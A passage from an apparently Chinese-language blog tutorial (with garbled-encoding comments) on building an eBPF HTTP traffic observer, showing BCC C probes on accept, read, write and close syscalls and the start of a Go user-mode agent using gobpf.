timestamp_ns;</span><br><span class="line">    <span class="comment">// è¿æ¥çš„å”¯ä¸€ID</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_id_t</span> <span class="title">conn_id</span>;</span></span><br><span class="line">    <span class="comment">// å®¢æˆ·ç«¯åœ°å€</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ´»åŠ¨è¿æ¥çš„æ˜ å°„ã€‚mapåå­—æ˜¯conn_info_map</span></span><br><span class="line">BPF_HASH(conn_info_map, <span class="keyword">uint64_t</span>, struct <span class="keyword">conn_info_t</span>, <span class="number">131072</span>);</span><br><span class="line"><span class="comment">// ä¸€ä¸ªæ€§èƒ½ç¼“å†²åŒºï¼Œå…è®¸æˆ‘ä»¬å°†äº‹ä»¶ä»å†…æ ¸å‘é€åˆ°ç”¨æˆ·æ¨¡å¼</span></span><br><span class="line"><span class="comment">// è¯¥æ€§èƒ½ç¼“å†²åŒºä¸“ç”¨äºç‰¹æ®Šç±»å‹çš„äº‹ä»¶-æ‰“å¼€äº‹ä»¶</span></span><br><span class="line">BPF_PERF_OUTPUT(socket_open_events);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æŸ¥ç³»ç»Ÿè°ƒç”¨æ˜¯å¦æˆåŠŸå®Œæˆä»¥åŠæ˜¯å¦å°†æ–°è¿æ¥ä¿å­˜åœ¨ä¸“ç”¨è¿æ¥æ˜ å°„ä¸­çš„å¸®åŠ©å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __inline <span class="keyword">void</span> <span class="title">process_syscall_accept</span><span class="params">(struct pt_regs* ctx, <span class="keyword">uint64_t</span> id, <span class="keyword">const</span> struct <span class="keyword">accept_args_t</span>* args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// æå–è¿”å›ç ï¼Œæ£€æŸ¥æ˜¯å¦å¤±è´¥ï¼Œå¦‚æœæ˜¯ï¼Œç›´æ¥ç»ˆæ­¢ã€‚</span></span><br><span class="line">    <span class="keyword">int</span> ret_fd = PT_REGS_RC(ctx);</span><br><span class="line">    <span class="keyword">if</span> (ret_fd &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_info_t</span> <span class="title">conn_info</span> = &#123;</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> pid = id &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    conn_info.conn_id.pid = pid;</span><br><span class="line">    conn_info.conn_id.fd = ret_fd;</span><br><span class="line">    conn_info.conn_id.tsid = bpf_ktime_get_ns();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> pid_fd = ((<span class="keyword">uint64_t</span>)pid &lt;&lt; <span class="number">32</span>) | (<span class="keyword">uint32_t</span>)ret_fd;</span><br><span class="line">    <span class="comment">// å°†è¿æ¥ä¿¡æ¯ä¿å­˜åœ¨å…¨å±€mapä¸­ï¼Œå› æ­¤åœ¨å…¶ä»–ç³»ç»Ÿè°ƒç”¨ï¼ˆreadã€writeå’Œcloseï¼‰ä¸­ï¼Œæˆ‘ä»¬å°†èƒ½å¤ŸçŸ¥é“å·²ç»çœ‹åˆ°äº†è¿æ¥</span></span><br><span class="line">    conn_info_map.update(&amp;pid_fd, &amp;conn_info);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‘ç”¨æˆ·æ¨¡å¼å‘é€ä¸€ä¸ªæ‰“å¼€äº‹ä»¶ï¼Œè®©ç”¨æˆ·æ¨¡å¼çŸ¥é“æˆ‘ä»¬å·²ç»è¯†åˆ«äº†ä¸€ä¸ªæ–°çš„è¿æ¥ã€‚</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket_open_event_t</span> <span class="title">open_event</span> = &#123;</span>&#125;;</span><br><span class="line">    open_event.timestamp_ns = bpf_ktime_get_ns();</span><br><span class="line">    open_event.conn_id = conn_info.conn_id;</span><br><span class="line">bpf_probe_read(&amp;open_event.addr, <span class="keyword">sizeof</span>(open_event.addr), args-&gt;addr);</span><br><span class="line"></span><br><span class="line">    socket_open_events.perf_submit(ctx, &amp;open_event, <span class="keyword">sizeof</span>(struct <span class="keyword">socket_open_event_t</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ°æ­¤ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåœ¨å†…æ ¸ä¾§è¯†åˆ«æ–°çš„è¿æ¥å¹¶å°†ä¿¡æ¯å‘é€è‡³ç”¨æˆ·ä»£ç†ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†hook readç³»ç»Ÿè°ƒç”¨</p><p>åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å°†hook readç³»ç»Ÿè°ƒç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸€ä¸ªè¾…åŠ©ç»“æ„ï¼Œç”¨äºç¼“å­˜å…¥å£é’©å­å’Œå‡ºå£é’©å­ä¹‹é—´è¯»/å†™ç³»ç»Ÿè°ƒç”¨çš„è¾“å…¥å‚æ•°ã€‚</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_args_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> fd;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// map å­˜å‚¨å…¥å£å’Œå‡ºå£æŒ‚é’©ä¹‹é—´çš„è¯»å–ç³»ç»Ÿè°ƒç”¨å‚æ•°ã€‚</span></span><br><span class="line">BPF_HASH(active_read_args_map, <span class="keyword">uint64_t</span>, struct <span class="keyword">data_args_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// original signature: ssize_t read(int fd, void *buf, size_t count);</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">syscall__probe_entry_read</span><span class="params">(struct pt_regs* ctx, <span class="keyword">int</span> fd, <span class="keyword">char</span>* buf, <span class="keyword">size_t</span> count)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> id = bpf_get_current_pid_tgid();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å­˜å‚¨å‚æ•°</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_args_t</span> <span class="title">read_args</span> = &#123;</span>&#125;;</span><br><span class="line">    read_args.fd = fd;</span><br><span class="line">    read_args.buf = buf;</span><br><span class="line">    active_read_args_map.update(&amp;id, &amp;read_args);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">syscall__probe_ret_read</span><span class="params">(struct pt_regs* ctx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> id = bpf_get_current_pid_tgid();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç³»ç»Ÿè°ƒç”¨çš„è¿”å›ç ä¹Ÿæ˜¯è¯»å–çš„å­—èŠ‚æ•°ã€‚</span></span><br><span class="line">    <span class="keyword">ssize_t</span> bytes_count = PT_REGS_RC(ctx); </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_args_t</span>* <span class="title">read_args</span> = <span class="title">active_read_args_map</span>.<span class="title">lookup</span>(&amp;<span class="title">id</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (read_args != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// kIngress æ˜¯ä¸€ä¸ªæšä¸¾å€¼ï¼Œè®© process_dataå‡½æ•°çŸ¥é“è¾“å…¥ç¼“å†²åŒºæ˜¯ä¼ å…¥è¿˜æ˜¯ä¼ å‡ºã€‚</span></span><br><span class="line">        process_data(ctx, id, kIngress, read_args, bytes_count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æœ€åæ¸…ç†map</span></span><br><span class="line">    active_read_args_map.<span class="keyword">delete</span>(&amp;id);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†è¾…åŠ©å‡½æ•°æ¥å¤„ç†<code>read</code>å’Œ<code>write</code>ç³»ç»Ÿè°ƒç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ•°æ®ç¼“å†²åŒºæ¶ˆæ¯å¤§å°ï¼ŒBPFæœ€å¤šå¯ä»¥å°†è¿™ä¸ªæ•°é‡çš„æ•°æ®æäº¤åˆ°perfç¼“å†²åŒºã€‚</span></span><br><span class="line"><span class="comment">//å†…æ ¸å¤§å°é™åˆ¶ä¸º32kb</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_MSG_SIZE 30720  <span class="comment">// 30KiB</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket_data_event_t</span> &#123;</span></span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">attr_t</span> &#123;</span></span><br><span class="line">    <span class="comment">// ç³»ç»Ÿè°ƒç”¨å®Œæˆæ—¶çš„æ—¶é—´æˆ³</span></span><br><span class="line">    <span class="keyword">uint64_t</span> timestamp_ns;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿æ¥æ ‡è¯†ç¬¦ (PID, FD, etc.).</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_id_t</span> <span class="title">conn_id</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// msg å­—æ®µç¼–ç çš„å®é™…æ•°æ®çš„ç±»å‹ï¼Œè°ƒç”¨è€…ä½¿ç”¨å®ƒæ¥ç¡®å®šå¦‚ä½•è§£é‡Šæ•°æ®ã€‚</span></span><br><span class="line">    <span class="keyword">enum</span> <span class="keyword">traffic_direction_t</span> direction;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŸå§‹æ¶ˆæ¯çš„å¤§å°ã€‚æˆ‘ä»¬ä½¿ç”¨å®ƒæ¥æˆªæ–­ msg å­—æ®µä»¥æœ€å°åŒ–æ­£åœ¨ä¼ è¾“çš„æ•°æ®é‡ã€‚</span></span><br><span class="line">    <span class="keyword">uint32_t</span> msg_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿æ¥ä¸Šæ­¤äº‹ä»¶çš„ä» 0 å¼€å§‹çš„ä½ç½®ç¼–å·ï¼Œä»¥å­—èŠ‚ä½ç½®è¡¨ç¤ºã€‚</span></span><br><span class="line">    <span class="comment">// è¯¥ä½ç½®æ˜¯è¯¥æ¶ˆæ¯çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ã€‚</span></span><br><span class="line">    <span class="keyword">uint64_t</span> pos;</span><br><span class="line">  &#125; attr;</span><br><span class="line">  <span class="keyword">char</span> msg[MAX_MSG_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Perfç¼“å†²åŒºå‘ç”¨æˆ·æ¨¡å¼ä»£ç†å‘é€æ•°æ®äº‹ä»¶</span></span><br><span class="line">BPF_PERF_OUTPUT(socket_data_events);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤„ç†è¯»/å†™ç³»ç»Ÿè°ƒç”¨çš„è¾…åŠ©å‡½æ•°</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> __attribute__((__always_inline__)) <span class="function"><span class="keyword">void</span> <span class="title">process_data</span><span class="params">(struct pt_regs* ctx, <span class="keyword">uint64_t</span> id,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                                   <span class="keyword">enum</span> <span class="keyword">traffic_direction_t</span> direction,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                                   <span class="keyword">const</span> struct <span class="keyword">data_args_t</span>* args, <span class="keyword">ssize_t</span> bytes_count)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åœ¨è®¿é—®æŒ‡é’ˆä¹‹å‰å§‹ç»ˆæ£€æŸ¥å¯¹æŒ‡é’ˆçš„è®¿é—®</span></span><br><span class="line">    <span class="keyword">if</span> (args-&gt;buf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯¹äº read å’Œ write ç³»ç»Ÿè°ƒç”¨ï¼Œè¿”å›ç æ˜¯å†™å…¥æˆ–è¯»å–çš„å­—èŠ‚æ•°ï¼Œå› æ­¤é›¶è¡¨ç¤ºæ²¡æœ‰å†™å…¥æˆ–è¯»å–ä»»ä½•å†…å®¹ï¼Œè´Ÿæ•°è¡¨ç¤ºç³»ç»Ÿè°ƒç”¨å¤±è´¥ã€‚</span></span><br><span class="line">    <span class="keyword">if</span> (bytes_count &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> pid = id &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pid_fd = ((<span class="keyword">uint64_t</span>)pid &lt;&lt; <span class="number">32</span>) | (<span class="keyword">uint32_t</span>)args-&gt;fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_info_t</span>* <span class="title">conn_info</span> = <span class="title">conn_info_map</span>.<span class="title">lookup</span>(&amp;<span class="title">pid_fd</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (conn_info == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// æ­£åœ¨è¯»/å†™çš„fdä¸ä»£è¡¨IPV4å¥—æ¥å­—fd</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥è¿æ¥æ˜¯å¦å·²ç»æ˜¯HTTPæˆ–è€…æ£€æŸ¥æ˜¯å¦æ˜¯æ–°è¿æ¥ï¼Œå¦‚æœæ˜¯HTTPï¼Œåˆ™è¿”å›true</span></span><br><span class="line">    <span class="keyword">if</span> (is_http_connection(conn_info, args-&gt;buf, bytes_count)) &#123;</span><br><span class="line">        <span class="comment">// åˆ†é…æ–°äº‹ä»¶</span></span><br><span class="line">        <span class="keyword">uint32_t</span> kZero = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">socket_data_event_t</span>* <span class="title">event</span> = <span class="title">socket_data_event_buffer_heap</span>.<span class="title">lookup</span>(&amp;<span class="title">kZero</span>);</span></span><br><span class="line">        <span class="keyword">if</span> (event == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¡«å……æ•°æ®äº‹ä»¶çš„å…ƒæ•°æ®</span></span><br><span class="line">        event-&gt;attr.timestamp_ns = bpf_ktime_get_ns();</span><br><span class="line">        event-&gt;attr.direction = direction;</span><br><span class="line">        event-&gt;attr.conn_id = conn_info-&gt;conn_id;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦ä¸€ä¸ªè¾…åŠ©å‡½æ•°ï¼Œå¦‚æœç»™å®šç¼“å†²åŒºå¤§å°ï¼Œåˆ™å°†å…¶æ‹†åˆ†ä¸ºå—</span></span><br><span class="line">        perf_submit_wrapper(ctx, direction, args-&gt;buf, bytes_count, conn_info, event);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ›´æ–°conn_infoæ€»å†™å…¥/è¯»å–çš„å­—èŠ‚æ•°</span></span><br><span class="line"><span class="keyword">switch</span> (direction) &#123;</span><br><span class="line">        <span class="keyword">case</span> kEgress:</span><br><span class="line">            conn_info-&gt;wr_bytes += bytes_count;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> kIngress:</span><br><span class="line">            conn_info-&gt;rd_bytes += bytes_count;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±æ­¤å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„è¾…åŠ©å‡½æ•°ä¼šæ£€æŸ¥<code>read</code>æˆ–è€…<code>write</code>ç³»ç»Ÿè°ƒç”¨æ˜¯å¦æˆåŠŸå®Œæˆã€‚é€šè¿‡æ£€æŸ¥ è¯»å–ï¼ˆå†™å…¥ï¼‰å­—èŠ‚ï¼Œæ£€æŸ¥æ­£åœ¨è¯»å–ï¼ˆæˆ–å†™å…¥ï¼‰çš„æ•°æ®æ˜¯å¦ä¸ºHTTPã€‚å¦‚æœæ˜¯ï¼Œåˆ™å‘é€å®ƒåˆ°ç”¨æˆ·æ¨¡å¼ä»£ç†å¹¶ä½œä¸ºä¸€ä¸ªäº‹ä»¶ã€‚</p><p>ç„¶åä¼šå¿«é€Ÿè½¬åˆ°writeç³»ç»Ÿè°ƒç”¨ã€‚</p><p>æœ€åä»£ç å¤„ç†closeäº‹ä»¶ã€‚åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†è¾…åŠ©å‡½æ•°æ¥å¤„ç†closeç³»ç»Ÿè°ƒç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å‘é€åˆ°ç”¨æˆ·æ¨¡å¼ä»£ç†çš„å…³é—­äº‹ä»¶çš„ç»“æ„</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket_close_event_t</span> &#123;</span></span><br><span class="line">    <span class="comment">// closeç³»ç»Ÿè°ƒç”¨çš„æ—¶é—´æˆ³</span></span><br><span class="line">    <span class="keyword">uint64_t</span> timestamp_ns;</span><br><span class="line">    <span class="comment">// è¿æ¥çš„å”¯ä¸€id</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_id_t</span> <span class="title">conn_id</span>;</span></span><br><span class="line">    <span class="comment">// åœ¨è¯¥è¿æ¥ä¸Šå†™å…¥çš„æ€»å­—èŠ‚æ•°</span></span><br><span class="line">    <span class="keyword">int64_t</span> wr_bytes;</span><br><span class="line">    <span class="comment">// åœ¨è¯¥è¿æ¥ä¸Šè¯»å–çš„æ€»å­—èŠ‚æ•°</span></span><br><span class="line">    <span class="keyword">int64_t</span> rd_bytes;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Perfç¼“å†²åŒºå‘ç”¨æˆ·æ¨¡å¼ä»£ç†å‘é€closeäº‹ä»¶</span></span><br><span class="line">BPF_PERF_OUTPUT(socket_close_events);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> __attribute__((__always_inline__)) <span class="function"><span class="keyword">void</span> <span class="title">process_syscall_close</span><span class="params">(struct pt_regs* ctx, <span class="keyword">uint64_t</span> id,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                                            <span class="keyword">const</span> struct <span class="keyword">close_args_t</span>* close_args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret_val = PT_REGS_RC(ctx);</span><br><span class="line">    <span class="comment">// å¦‚æœç³»ç»Ÿè°ƒç”¨å¤±è´¥ï¼Œç›´æ¥return</span></span><br><span class="line">    <span class="keyword">if</span> (ret_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> pid = id &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pid_fd = ((<span class="keyword">uint64_t</span>)pid &lt;&lt; <span class="number">32</span>) | (<span class="keyword">uint32_t</span>)close_args-&gt;fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_info_t</span>* <span class="title">conn_info</span> = <span class="title">conn_info_map</span>.<span class="title">lookup</span>(&amp;<span class="title">pid_fd</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (conn_info == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// æ­£åœ¨å…³é—­çš„fdï¼Œå¹¶ä¸ä»£è¡¨IPV4å¥—æ¥å­—fd</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‘ç”¨æˆ·æ¨¡å¼ä»£ç†å‘é€ä¸€ä¸ªæŒ‡ç¤ºè¿æ¥å·²å…³é—­çš„äº‹ä»¶</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket_close_event_t</span> <span class="title">close_event</span> = &#123;</span>&#125;;</span><br><span class="line">    close_event.timestamp_ns = bpf_ktime_get_ns();</span><br><span class="line">    close_event.conn_id = conn_info-&gt;conn_id;</span><br><span class="line">    close_event.rd_bytes = conn_info-&gt;rd_bytes;</span><br><span class="line">    close_event.wr_bytes = conn_info-&gt;wr_bytes;</span><br><span class="line"></span><br><span class="line">    socket_close_events.perf_submit(ctx, &amp;close_event, <span class="keyword">sizeof</span>(struct <span class="keyword">socket_close_event_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»æ˜ å°„ä¸­åˆ é™¤è¿æ¥</span></span><br><span class="line">    conn_info_map.<span class="keyword">delete</span>(&amp;pid_fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç”¨æˆ·ä»£ç†Goå®ç°"><a href="#ç”¨æˆ·ä»£ç†Goå®ç°" class="headerlink" title="ç”¨æˆ·ä»£ç†Goå®ç°"></a>ç”¨æˆ·ä»£ç†Goå®ç°</h4><p>ç”¨æˆ·æ¨¡å¼ä»£ç†ä½¿ç”¨gobpfåº“ç¼–å†™ã€‚ç¬¬ä¸€æ­¥æ˜¯ç¼–è¯‘ä»£ç ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bpfModule := bcc.NewModule(<span class="keyword">string</span>(bpfSourceCodeContent), <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">defer</span> bpfModule.Close()</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ›å»ºä¸€ä¸ªè¿æ¥å·¥å‚ï¼Œè´Ÿè´£ä¿å­˜æ‰€æœ‰è¿æ¥å®ä¾‹å¹¶æ‰“å°å°±ç»ªè¿æ¥å¹¶åˆ é™¤ä¸æ´»åŠ¨æˆ–æ ¼å¼é”™è¯¯çš„è¿æ¥ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºè¿æ¥å·¥å‚å¹¶å°† 1åˆ†é’Ÿè®¾ç½®ä¸ºä¸æ´»åŠ¨é˜ˆå€¼ï¼Œè¿™æ„å‘³ç€åœ¨æœ€åä¸€åˆ†é’Ÿå†…æœªæ”¶åˆ°ä»»ä½•äº‹ä»¶çš„è¿æ¥å°†è¢«å…³é—­ã€‚</span></span><br><span class="line">connectionFactory := connections.NewFactory(time.Minute)</span><br><span class="line"><span class="comment">// å¯åŠ¨ä¸€ä¸ªgoroutineã€‚æ¯ 10 ç§’è¿è¡Œä¸€æ¬¡å¹¶æ‰“å°å°±ç»ªè¿æ¥å¹¶åˆ é™¤éæ´»åŠ¨æˆ–æ ¼å¼é”™è¯¯çš„è¿æ¥ã€‚</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">connectionFactory.HandleReadyConnections()</span><br><span class="line">time.Sleep(<span class="number">10</span> * time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><p>åŠ è½½ perf ç¼“å†²åŒºå¤„ç†ç¨‹åº</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> err := bpfwrapper.LaunchPerfBufferConsumers(bpfModule, connectionFactory); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panic(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯å…³äºå•ç”¨æˆ·æ¨¡å¼perfç¼“å†²åŒºå¤„ç†ç¨‹åºçš„è¯´æ˜ã€‚</p><p>æ¯ä¸ªå¤„ç†ç¨‹åºé€šè¿‡ç®¡é“(inputChan)è·å–äº‹ä»¶ï¼Œå¹¶ä¸”æ¯ä¸ªäº‹ä»¶çš„ç±»å‹ä¸ºå­—èŠ‚æ•°ç»„([]byte)ï¼Œå¯¹äºæ¯ä¸ªäº‹ä»¶ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶è½¬æ¢ä¸ºgoçš„æ•°æ®ç»“æ„è¡¨ç¤ºã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConnID is a conversion of the following C-Struct into 